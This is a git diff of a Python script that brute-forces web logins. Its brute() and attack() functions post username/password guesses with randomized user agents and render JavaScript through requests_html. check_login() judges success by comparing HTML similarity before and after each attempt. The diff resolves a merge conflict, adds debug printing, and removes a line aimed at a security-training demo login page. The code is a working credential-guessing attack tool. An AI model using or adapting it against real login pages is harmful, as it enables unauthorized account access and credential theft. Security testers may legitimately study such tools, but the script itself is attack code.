@@ -5,17 +5,9 @@ from requests_html import HTMLSession
 import time
 import requests
 from lxml import html
-from scipy import rand
 import mechanize
 import ssl
 success = False
-from requests_html import HTMLSession
-session = HTMLSession()
-
-
-res = session.get('https://demo.securityknowledgeframework.org/auth/login')
-
-res.html.render()  # this call executes the js in the page
 
 def brute(parameters, passwords):
     '''
@@ -79,27 +71,19 @@ def attack(content):
     headers['User-Agent'] = get_random_user_agent()
     payload = content['req_body']
     print("[+ req_body]: " + str(content['req_body']))
-<<<<<<< HEAD
-
-    # res = requests.get(url)
-
-    if content['method'] == 'post':
-        resp = session.post(content['host'], data=payload)
-        resp.html.render()
-=======
     session = HTMLSession()
     res = session.get(url)
     res.html.render(sleep=1, keep_page=True)
+    # print(str(res.html.html))
     if content['method'] == 'post':
         resp = session.post(content['host'], data=payload)
         resp.html.render(sleep=1)
->>>>>>> 46eb08d9466178058534490744b8d5d30431bff3
     else:
         resp = session.get(url,data=payload,headers=headers)
         resp.html.render(sleep=1)
-
+    print(str(resp.html.html) +'\n\n')
     print('[+][attack] trying' + ' username:' + content['username'] + ' password:' + content['password'])
-    print(resp.status_code)
+    print(str(resp.status_code))
     if check_login(resp, res):
         print('login successfull\n\nusername: ' + content['username'] + '\npassword: ' + content['password'])
         global success
@@ -151,14 +135,18 @@ def check_login(content_1, content_2):
     checks if login was successful by checking if status code is 200 or 302 and if the html similarity of the login
     page and the page after sending the credintials is bellow 70% + the response content is lager the the login page content
     '''
+    print("\n\n\n\n\nbefore\n\n\n\n\n")
+    print(content_1.html.html)
+    print("\n\n\n\n\nafter\n\n\n\n\n")
+    print(content_2.html.html)
     from html_similarity import style_similarity, structural_similarity, similarity
     k=0.3
-    similarity = k * structural_similarity(content_1.text, content_2.text) + (1 - k) * style_similarity(content_1.text, content_2.text)
-    
+    similarity = k * structural_similarity(content_1.html.html, content_2.html.html) + (1 - k) * style_similarity(content_1.html.html, content_2.html.html)
+    print(str(similarity))
     if  content_1.status_code >= 400:
         return False
-    
-    elif similarity < 0.7 and len(content_1.html.html) > len(content_2.html.html):
+
+    elif similarity < 0.7:
         return True
     
     elif  content_1.status_code == 201:
